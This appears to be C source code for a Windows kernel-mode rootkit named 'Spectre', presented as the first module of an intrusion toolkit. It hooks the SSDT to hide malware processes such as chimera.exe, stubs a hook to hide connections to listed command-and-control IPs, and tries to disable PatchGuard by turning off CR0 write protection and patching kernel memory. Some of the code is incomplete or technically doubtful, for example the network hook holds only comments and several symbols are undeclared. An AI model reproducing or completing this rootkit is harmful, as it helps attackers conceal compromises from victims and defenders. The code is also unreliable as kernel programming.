// -----------------------------------------------------------------------------------|
//                                                                                    |
// MODULE 1: KERNEL-LEVEL ROOTKIT - "SPECTRE"                                         |
// Once initial access is achieved, we establish kernel dominance.                    |
//                                                                                    |
// -----------------------------------------------------------------------------------|

// spectre_driver.c - Kernel Mode Rootkit
#include <ntddk.h>
#include <wdm.h>

#define DEVICE_NAME L"\\Device\\SpectreDrv"
#define SYMLINK_NAME L"\\DosDevices\\SpectreDrv"

// SSDT (System Service Descriptor Table) hook to hide processes
typedef struct _SYSTEM_SERVICE_TABLE {
    PVOID ServiceTable;
    PULONG CounterTable;
    ULONG ServiceLimit;
    PUCHAR ArgumentTable;
} SYSTEM_SERVICE_TABLE, *PSYSTEM_SERVICE_TABLE;

extern PSYSTEM_SERVICE_TABLE KeServiceDescriptorTable;

// Original NtQuerySystemFunction
ULONG_PTR OriginalNtQuerySystemInformation = 0;

// Hook function
NTSTATUS HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))OriginalNtQuerySystemInformation)(
        SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    
    // Hide our malware process from tasklist, Process Explorer, etc.
    if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status)) {
        PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION prev = NULL;
        
        while (curr) {
            if (curr->ImageName.Buffer) {
                // Check if this is our malware process (by PID or name)
                if (curr->UniqueProcessId == (HANDLE)0x1337 || 
                    wcsstr(curr->ImageName.Buffer, L"chimera.exe") ||
                    wcsstr(curr->ImageName.Buffer, L"spectre.sys")) {
                    
                    if (prev) {
                        // Remove from linked list
                        prev->NextEntryOffset += curr->NextEntryOffset;
                    } else {
                        // First entry - modify start pointer
                        *(PULONG)SystemInformation = curr->NextEntryOffset;
                    }
                } else {
                    prev = curr;
                }
            }
            
            if (curr->NextEntryOffset == 0) break;
            curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
        }
    }
    
    return status;
}

// Hook network connections too
NTSTATUS HookedNtDeviceIoControlFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
) {
    // Hide C2 network connections from netstat, TCPView
    if (IoControlCode == 0x120003) { // TCP_QUERY_INFORMATION_EX
        // Parse and filter out our C2 IPs: 185.243.115.84, 172.67.182.13
        // Return modified connection list
    }
    
    return STATUS_SUCCESS;
}

// Disable PatchGuard for Windows 10/11
VOID DisablePatchGuard() {
    ULONG_PTR cr0 = __readcr0();
    __writecr0(cr0 & ~0x10000);  // Disable write protection
    
    // Locate and modify PatchGuard initialization
    PUCHAR KiFilterFiberContext = (PUCHAR)0xFFFFF80000000000;
    for (ULONG i = 0; i < 0x500000; i++) {
        if (*(PULONG)(KiFilterFiberContext + i) == 0x53444850) { // "PHDS"
            RtlFillMemory(KiFilterFiberContext + i, 0x100, 0x90); // NOP out
            break;
        }
    }
    
    __writecr0(cr0);  // Restore write protection
}

DRIVER_INITIALIZE DriverEntry;
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    // 1. Disable PatchGuard
    DisablePatchGuard();
    
    // 2. Hook SSDT functions
    OriginalNtQuerySystemInformation = KeServiceDescriptorTable->ServiceTable[0x36];
    KeServiceDescriptorTable->ServiceTable[0x36] = (ULONG_PTR)HookedNtQuerySystemInformation;
    
    // 3. Register process creation callback to hide child processes
    PsSetCreateProcessNotifyRoutine(ProcessCreateNotifyRoutine, FALSE);
    
    // 4. Establish communication with userland
    UNICODE_STRING devName, symLink;
    RtlInitUnicodeString(&devName, DEVICE_NAME);
    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    
    IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
    IoCreateSymbolicLink(&symLink, &devName);
    
    return STATUS_SUCCESS;
}
